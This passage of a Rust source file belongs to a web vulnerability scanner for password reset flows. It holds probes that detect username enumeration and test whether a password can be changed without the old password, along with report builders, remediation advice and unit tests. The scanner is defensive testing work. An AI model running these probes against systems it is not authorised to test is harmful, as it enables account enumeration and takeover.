        (vulnerabilities, tests_run)
    }

    /// Test username enumeration
    async fn test_username_enumeration(
        &self,
        endpoint: &ResetEndpoint,
    ) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let tests_run = 2;

        debug!("Testing username enumeration on {}", endpoint.url);

        // Request 1: Valid-looking email
        let valid_email = "existing.user@company.test";
        let invalid_email = format!(
            "nonexistent-{}@invalid-domain-xyz.test",
            Self::generate_id()
        );

        let mut responses: Vec<(String, u16, usize)> = Vec::new();

        for email in [&valid_email.to_string(), &invalid_email] {
            let body = if endpoint.is_api {
                format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, email)
            } else {
                format!("{}={}", endpoint.email_param, urlencoding::encode(email))
            };

            let content_type = if endpoint.is_api {
                "application/json"
            } else {
                "application/x-www-form-urlencoded"
            };

            let headers = vec![("Content-Type".to_string(), content_type.to_string())];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    responses.push((
                        response.body.to_lowercase(),
                        response.status_code,
                        response.body.len(),
                    ));
                }
                Err(_) => {}
            }
        }

        if responses.len() == 2 {
            let (body1, status1, len1) = &responses[0];
            let (body2, status2, len2) = &responses[1];

            // Check for enumeration via different responses
            let status_differs = status1 != status2;
            let length_differs = (*len1 as i64 - *len2 as i64).abs() > 20;

            // Check for different messages
            let msg_differs = (body1.contains("user not found")
                && !body2.contains("user not found"))
                || (body1.contains("no account") && !body2.contains("no account"))
                || (body1.contains("doesn't exist") && !body2.contains("doesn't exist"))
                || (body1.contains("email sent") && !body2.contains("email sent"))
                || (body1.contains("invalid email") != body2.contains("invalid email"));

            if status_differs || length_differs || msg_differs {
                let evidence = format!(
                    "Different responses for existing vs non-existing users:\n\
                    - Status codes: {} vs {}\n\
                    - Response lengths: {} vs {} bytes\n\
                    - Content differs: {}",
                    status1, status2, len1, len2, msg_differs
                );

                vulnerabilities.push(self.create_vulnerability(
                    &endpoint.url,
                    "Differential response analysis",
                    "username_enumeration",
                    "Username Enumeration via Password Reset",
                    Severity::Medium,
                    Confidence::Medium,
                    &format!(
                        "Password reset endpoint reveals whether an email/username exists. \
                        {}\n\n\
                        Attackers can use this to:\n\
                        - Build list of valid accounts\n\
                        - Target specific users for attack\n\
                        - Validate leaked credentials",
                        evidence
                    ),
                    "CWE-204",
                    5.3,
                ));
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Test password change security
    async fn test_password_change_security(
        &self,
        endpoint: &ResetEndpoint,
    ) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let tests_run = 1;

        debug!("Testing password change security on {}", endpoint.url);

        // Try to change password without providing old password
        let body = if endpoint.is_api {
            r#"{"new_password":"NewPassword123!","confirm_password":"NewPassword123!"}"#.to_string()
        } else {
            "new_password=NewPassword123!&confirm_password=NewPassword123!".to_string()
        };

        let content_type = if endpoint.is_api {
            "application/json"
        } else {
            "application/x-www-form-urlencoded"
        };

        let headers = vec![("Content-Type".to_string(), content_type.to_string())];

        match self
            .http_client
            .post_with_headers(&endpoint.url, &body, headers)
            .await
        {
            Ok(response) => {
                let body_lower = response.body.to_lowercase();

                // Check if password change was accepted without old password
                if response.status_code == 200
                    && (body_lower.contains("success")
                        || body_lower.contains("password changed")
                        || body_lower.contains("updated"))
                {
                    vulnerabilities.push(self.create_vulnerability(
                        &endpoint.url,
                        "Password change without old password verification",
                        "no_old_password_check",
                        "Password Change Without Old Password Verification",
                        Severity::High,
                        Confidence::Medium,
                        "Password can be changed without providing the current password. \
                        This allows attackers with session access (XSS, session hijacking) \
                        to permanently take over the account.",
                        "CWE-620",
                        7.5,
                    ));
                }

                // Check if endpoint doesn't require old password field at all
                if !body_lower.contains("current password")
                    && !body_lower.contains("old password")
                    && !body_lower.contains("current_password")
                    && !body_lower.contains("old_password")
                    && !body_lower.contains("existing password")
                {
                    vulnerabilities.push(self.create_vulnerability(
                        &endpoint.url,
                        "No old password field in password change form",
                        "missing_old_password_field",
                        "Password Change Missing Old Password Verification",
                        Severity::Medium,
                        Confidence::Low,
                        "Password change form does not appear to require the current password. \
                        Best practice is to always verify the old password before allowing change.",
                        "CWE-620",
                        5.3,
                    ));
                }
            }
            Err(e) => {
                debug!("Request failed: {}", e);
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Resolve relative URL to absolute
    fn resolve_url(&self, path: &str, base_url: &str) -> String {
        if path.starts_with("http://") || path.starts_with("https://") {
            return path.to_string();
        }

        if path.is_empty() || path == "#" {
            return base_url.to_string();
        }

        if let Ok(base) = url::Url::parse(base_url) {
            if let Ok(resolved) = base.join(path) {
                return resolved.to_string();
            }
        }

        // Fallback
        if path.starts_with('/') {
            if let Ok(parsed) = url::Url::parse(base_url) {
                if let Some(host) = parsed.host_str() {
                    return format!("{}://{}{}", parsed.scheme(), host, path);
                }
            }
        }

        format!(
            "{}/{}",
            base_url.trim_end_matches('/'),
            path.trim_start_matches('/')
        )
    }

    /// Create vulnerability report
    fn create_vulnerability(
        &self,
        url: &str,
        payload: &str,
        technique: &str,
        title: &str,
        severity: Severity,
        confidence: Confidence,
        description: &str,
        cwe: &str,
        cvss: f32,
    ) -> Vulnerability {
        let verified = matches!(confidence, Confidence::High);

        Vulnerability {
            id: format!("prp_{}_{}", technique, Self::generate_id()),
            vuln_type: title.to_string(),
            severity,
            confidence,
            category: "Broken Authentication".to_string(),
            url: url.to_string(),
            parameter: Some("Password Reset".to_string()),
            payload: payload.to_string(),
            description: format!(
                "{}\n\n\
                **Attack Technique**: {}\n\n\
                **Impact**:\n\
                Password reset poisoning allows attackers to steal password reset tokens, \
                enabling account takeover without knowing the victim's credentials. \
                The attacker can:\n\
                1. Request password reset for victim's account\n\
                2. Intercept or redirect the reset link\n\
                3. Use the token to set a new password\n\
                4. Take complete control of the account",
                description, technique
            ),
            evidence: Some(format!(
                "Payload: {}\n\
                Technique: {}\n\
                Attacker Domain: {}",
                payload, technique, self.attacker_domain
            )),
            cwe: cwe.to_string(),
            cvss,
            verified,
            false_positive: false,
            remediation: self.get_remediation(technique),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_confidence: None,
                ml_data: None,
        }
    }

    /// Get remediation advice based on technique
    fn get_remediation(&self, technique: &str) -> String {
        match technique {
            t if t.contains("host") || t.contains("forward") => r#"IMMEDIATE ACTION REQUIRED - Password Reset Poisoning:

1. **Never Trust Host Header for URL Generation**
   ```python
   # BAD - Uses Host header (vulnerable)
   reset_url = f"{request.scheme}://{request.get_host()}/reset/{token}"

   # GOOD - Use configured domain
   reset_url = f"{settings.SITE_URL}/reset/{token}"
   ```

2. **Validate and Ignore Forwarded Headers**
   ```python
   # Django - Configure ALLOWED_HOSTS strictly
   ALLOWED_HOSTS = ['example.com', 'www.example.com']

   # Ignore X-Forwarded-Host unless from trusted proxy
   USE_X_FORWARDED_HOST = False
   ```

3. **Configure Reverse Proxy Correctly**
   ```nginx
   # Nginx - Set explicit Host
   proxy_set_header Host $host;
   # Remove untrusted headers
   proxy_set_header X-Forwarded-Host "";
   ```

4. **Use Absolute URLs from Configuration**
   ```javascript
   // Node.js
   const resetUrl = `${process.env.APP_URL}/reset/${token}`;
   // NEVER: `${req.headers.host}/reset/${token}`
   ```

5. **Implement Host Header Validation**
   ```java
   String host = request.getHeader("Host");
   if (!ALLOWED_HOSTS.contains(host)) {
       throw new SecurityException("Invalid host header");
   }
   ```

References:
- https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"#.to_string(),

            t if t.contains("dangling") || t.contains("markup") => r#"IMMEDIATE ACTION REQUIRED - Dangling Markup Injection:

1. **Sanitize Email Input**
   ```python
   import re

   def sanitize_email(email):
       # Only allow valid email characters
       if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
           raise ValueError("Invalid email format")
       return email
   ```

2. **Encode HTML in Email Templates**
   ```python
   # Use HTML escaping in email templates
   from html import escape

   email_body = f"Reset link for: {escape(user_email)}"
   ```

3. **Use Plain Text Emails for Security-Critical Functions**
   ```python
   # Send password reset as plain text
   send_mail(
       subject="Password Reset",
       message=f"Click here: {reset_url}",  # Plain text
       html_message=None,  # No HTML for reset emails
   )
   ```

4. **Content Security Policy for Email Clients**
   ```html
   <!-- If HTML email is required -->
   <meta http-equiv="Content-Security-Policy"
         content="default-src 'none'; img-src https://yourdomain.com;">
   ```

References:
- https://portswigger.net/web-security/cross-site-scripting/dangling-markup
- https://owasp.org/www-community/attacks/Content_Spoofing"#.to_string(),

            t if t.contains("array") || t.contains("cc") || t.contains("bcc") || t.contains("separator") => r#"IMMEDIATE ACTION REQUIRED - Email Parameter Manipulation:

1. **Validate Email Format Strictly**
   ```python
   import re

   def validate_email(email):
       # Reject any newlines, commas, semicolons
       if re.search(r'[\r\n,;]', email):
           raise ValueError("Invalid characters in email")

       # Validate email format
       pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
       if not re.match(pattern, email):
           raise ValueError("Invalid email format")

       return email.strip().lower()
   ```

2. **Use Email Sending Libraries with Proper Escaping**
   ```python
   # Python - Use email library properly
   from email.utils import formataddr

   # Library handles escaping
   to_addr = formataddr(('User', validated_email))
   ```

3. **Reject Array Parameters**
   ```python
   def get_email_param(request):
       email = request.POST.get('email')

       # Reject if array/list
       if isinstance(email, list):
           raise ValueError("Multiple emails not allowed")

       return validate_email(email)
   ```

4. **Strip CRLF Characters**
   ```javascript
   function sanitizeEmail(email) {
       // Remove all control characters
       return email.replace(/[\x00-\x1F\x7F]/g, '');
   }
   ```

References:
- https://owasp.org/www-community/attacks/Email_Injection
- CWE-74: Improper Neutralization of Special Elements in Output"#.to_string(),

            t if t.contains("token") || t.contains("entropy") || t.contains("sequential") => r#"IMMEDIATE ACTION REQUIRED - Weak Token Generation:

1. **Use Cryptographically Secure Random Tokens**
   ```python
   import secrets

   def generate_reset_token():
       # Generate 256 bits of randomness (32 bytes = 43 chars base64)
       return secrets.token_urlsafe(32)
   ```

2. **Ensure Sufficient Token Length**
   ```javascript
   const crypto = require('crypto');

   function generateToken() {
       // 32 bytes = 256 bits of entropy
       return crypto.randomBytes(32).toString('hex');
   }
   ```

3. **Never Use Predictable Data**
   ```python
   # BAD - Predictable token
   token = hashlib.md5(f"{user_id}{timestamp}".encode()).hexdigest()

   # GOOD - Cryptographically random
   token = secrets.token_urlsafe(32)
   ```

4. **Set Token Expiration**
   ```python
   class PasswordResetToken(Model):
       token = CharField(max_length=64)
       user = ForeignKey(User)
       created_at = DateTimeField(auto_now_add=True)
       expires_at = DateTimeField()  # Set to created_at + 1 hour
       used = BooleanField(default=False)
   ```

5. **Single Use Tokens**
   ```python
   def use_reset_token(token):
       reset = PasswordResetToken.objects.get(token=token)

       if reset.used:
           raise TokenError("Token already used")
       if reset.expires_at < now():
           raise TokenError("Token expired")

       # Mark as used immediately
       reset.used = True
       reset.save()

       return reset.user
   ```

References:
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
- CWE-640: Weak Password Recovery Mechanism for Forgotten Password"#.to_string(),

            t if t.contains("rate") => r#"IMMEDIATE ACTION REQUIRED - Missing Rate Limiting:

1. **Implement Rate Limiting**
   ```python
   from ratelimit import limits

   @limits(calls=3, period=3600)  # 3 per hour per IP
   def forgot_password(request):
       email = request.POST.get('email')
       # Process reset request
   ```

2. **Rate Limit by Multiple Factors**
   ```python
   def check_rate_limit(request, email):
       ip = get_client_ip(request)

       # Limit by IP
       if redis.incr(f"reset:ip:{ip}") > 5:
           raise RateLimitExceeded()

       # Limit by email
       if redis.incr(f"reset:email:{email}") > 3:
           raise RateLimitExceeded()

       # Set expiration
       redis.expire(f"reset:ip:{ip}", 3600)
       redis.expire(f"reset:email:{email}", 3600)
   ```

3. **Add Progressive Delays**
   ```python
   def get_reset_delay(attempt_count):
       # Exponential backoff
       delays = [0, 5, 15, 30, 60, 300]  # seconds
       return delays[min(attempt_count, len(delays) - 1)]
   ```

4. **Add CAPTCHA for Suspicious Activity**
   ```python
   if reset_attempts > 2:
       if not verify_captcha(request):
           raise CaptchaRequired()
   ```

References:
- OWASP Rate Limiting: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"#.to_string(),

            t if t.contains("enumeration") => r#"IMMEDIATE ACTION REQUIRED - Username Enumeration:

1. **Use Consistent Responses**
   ```python
   def forgot_password(request):
       email = request.POST.get('email')

       # Always return same response
       message = "If an account exists with this email, you will receive a reset link."

       user = User.objects.filter(email=email).first()
       if user:
           send_reset_email(user)

       # Same response regardless of user existence
       return Response({"message": message})
   ```

2. **Consistent Timing**
   ```python
   import time
   import secrets

   def forgot_password(request):
       start = time.time()

       # Process request
       process_reset_request(request)

       # Ensure consistent response time
       elapsed = time.time() - start
       if elapsed < 1.0:
           time.sleep(1.0 - elapsed + secrets.randbelow(100) / 1000)

       return Response({"message": "Check your email"})
   ```

3. **Avoid Different Status Codes**
   ```python
   # BAD - Different status codes
   if not user_exists:
       return Response(status=404)

   # GOOD - Same status code
   return Response({"message": "Check your email"}, status=200)
   ```

References:
- CWE-204: Observable Response Discrepancy
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account"#.to_string(),

            _ => r#"IMMEDIATE ACTION REQUIRED - Password Reset Security:

1. **Use HTTPS Only**
   - All password reset flows must use HTTPS
   - Set Secure flag on all cookies
   - Use HSTS headers

2. **Implement Secure Token Generation**
   - Use cryptographically secure random tokens
   - Minimum 256 bits of entropy
   - Single-use tokens with expiration

3. **Validate All Input**
   - Sanitize email addresses
   - Validate Host headers
   - Reject malformed requests

4. **Rate Limit Reset Requests**
   - Limit by IP address
   - Limit by email address
   - Add CAPTCHA for suspicious activity

5. **Prevent Enumeration**
   - Use consistent responses
   - Consistent timing
   - Same status codes

6. **Secure Email Content**
   - Use plain text for reset emails
   - Escape all user input in HTML
   - Absolute URLs from configuration

References:
- OWASP Forgot Password Cheat Sheet
- CWE-640: Weak Password Recovery Mechanism"#.to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_scanner() -> PasswordResetPoisoningScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        PasswordResetPoisoningScanner::new(http_client)
    }

    #[test]
    fn test_token_analysis_high_entropy() {
        let scanner = create_test_scanner();

        // High entropy token (cryptographically random-looking)
        let token = "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7";
        let analysis = scanner.analyze_token(token);

        assert!(analysis.entropy_bits > 128.0);
        assert!(!analysis.is_sequential);
        assert!(!analysis.is_timestamp_based);
    }

    #[test]
    fn test_token_analysis_low_entropy() {
        let scanner = create_test_scanner();

        // Low entropy token (numeric only)
        let token = "12345678";
        let analysis = scanner.analyze_token(token);

        assert!(analysis.entropy_bits < 128.0);
        assert!(analysis.is_sequential);
    }

    #[test]
    fn test_token_analysis_timestamp() {
        let scanner = create_test_scanner();

        // Timestamp-based token
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let token = format!("reset_{}", now);

        let analysis = scanner.analyze_token(&token);
        assert!(analysis.is_timestamp_based);
    }

    #[test]
    fn test_detect_email_param() {
        let scanner = create_test_scanner();

        let html = r#"<form><input type="email" name="user_email" /></form>"#;
        assert_eq!(scanner.detect_email_param(html), "email");

        let html2 = r#"<form><input type="text" name="username" /></form>"#;
        assert_eq!(scanner.detect_email_param(html2), "username");
    }

    #[test]
    fn test_resolve_url() {
        let scanner = create_test_scanner();

        assert_eq!(
            scanner.resolve_url("/forgot-password", "https://example.com"),
            "https://example.com/forgot-password"
        );

        assert_eq!(
            scanner.resolve_url("https://other.com/path", "https://example.com"),
            "https://other.com/path"
        );
    }

    #[test]
    fn test_check_sequential() {
        let scanner = create_test_scanner();

        assert!(scanner.check_sequential("1234567890"));
        assert!(scanner.check_sequential("abcdefghij"));
        assert!(!scanner.check_sequential("a1b2c3d4e5f6g7h8"));
    }

    #[test]
    fn test_generate_id() {
        let id1 = PasswordResetPoisoningScanner::generate_id();
        let id2 = PasswordResetPoisoningScanner::generate_id();

        assert_eq!(id1.len(), 8);
        assert_ne!(id1, id2);
    }
}
